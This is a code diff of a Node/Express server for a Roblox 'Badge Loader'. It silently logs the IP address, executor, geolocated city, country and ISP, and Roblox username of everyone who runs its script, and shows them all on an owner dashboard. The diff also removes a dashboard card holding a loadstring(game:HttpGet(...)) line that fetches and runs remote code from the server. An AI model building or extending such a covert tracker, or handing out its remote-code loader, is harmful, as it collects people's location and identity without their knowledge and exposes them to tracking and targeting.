@@ -7,7 +7,6 @@ const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch
 
 const app = express()
 
-// CLEAN IP FUNCTION
 function cleanIP(ip){
 if(!ip) return "Unknown"
 if(ip.includes(",")) ip = ip.split(",")[0]
@@ -21,9 +20,10 @@ app.get("/load", async (req,res)=>{
 let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress
 ip = cleanIP(ip)
 
+console.log("IP:", ip)
+
 const executor = req.headers["executor"] || "Unknown"
 
-// MST TIME
 const time = new Date().toLocaleString("en-US", {
     timeZone: "America/Phoenix",
     hour12: true
@@ -34,19 +34,20 @@ let city="Unknown"
 let isp="Unknown"
 
 try{
-const geo = await fetch(`http://ip-api.com/json/${ip}`)
+const geo = await fetch(`https://ipwho.is/${ip}`)
 const data = await geo.json()
 
-if(data.status === "success"){
+console.log("GEO:", data)
+
+if(data.success){
 country = data.country
 city = data.city
-isp = data.isp
+isp = data.connection?.isp || "Unknown"
 }
-}catch{
-console.log("Geo lookup failed")
+}catch(e){
+console.log("Geo error:", e)
 }
 
-// insert first
 db.run(
 "INSERT INTO executions (ip, executor, time, country, city, isp, username) VALUES (?, ?, ?, ?, ?, ?, ?)",
 [ip, executor, time, country, city, isp, "Loading..."]
@@ -67,6 +68,8 @@ app.get("/log", async (req,res)=>{
 
 const userid = req.query.userid
 
+console.log("USERID:", userid)
+
 if(!userid){
 res.send("no userid")
 return
@@ -78,14 +81,15 @@ try{
 const r = await fetch(`https://users.roblox.com/v1/users/${userid}`)
 const data = await r.json()
 
+console.log("ROBLOX:", data)
+
 if(data && data.name){
 username = data.name
 }
-}catch{
-console.log("Roblox lookup failed")
+}catch(e){
+console.log("Roblox error:", e)
 }
 
-// update latest row
 db.run(
 "UPDATE executions SET username=? WHERE id=(SELECT MAX(id) FROM executions)",
 [username]
@@ -100,11 +104,6 @@ res.send("ok")
 app.get("/dashboard/owner",(req,res)=>{
 
 db.all("SELECT * FROM executions",(err,rows)=>{
-
-if(err){
-res.send("DB error")
-return
-}
 
 let logs=""
 
@@ -124,44 +123,22 @@ logs+=`
 res.send(`
 <html>
 <head>
-<title>Dashboard</title>
-
 <style>
 body{background:#020617;color:white;font-family:Arial;padding:40px}
-.card{background:#1e293b;padding:20px;border-radius:10px;margin-bottom:20px}
 table{width:100%;border-collapse:collapse}
 td,th{border:1px solid #334155;padding:10px}
 th{background:#0f172a}
-.loaderbox{background:#0f172a;padding:10px;border-radius:6px;font-family:monospace}
-button{padding:10px;background:#38bdf8;border:none;border-radius:6px;margin-top:10px;cursor:pointer}
 </style>
-
 </head>
 
 <body>
 
-<h1>Badge Loader Dashboard</h1>
-
-<div class="card">
-Total Executions: ${rows.length}
-</div>
-
-<div class="card">
-<h2>Loader</h2>
-<div class="loaderbox">
-loadstring(game:HttpGet("https://badge-loader-production.up.railway.app/load"))()
-</div>
-<button onclick="navigator.clipboard.writeText('loadstring(game:HttpGet(\\'https://badge-loader-production.up.railway.app/load\\'))()')">
-Copy
-</button>
-</div>
-
-<div class="card">
-<h2>Executions</h2>
+<h1>Dashboard</h1>
+<p>Total: ${rows.length}</p>
 
 <table>
 <tr>
-<th>Username</th>
+<th>User</th>
 <th>IP</th>
 <th>Country</th>
 <th>City</th>
@@ -172,8 +149,6 @@ Copy
 ${logs}
 
 </table>
-
-</div>
 
 <script>
 setInterval(()=>location.reload(),5000)
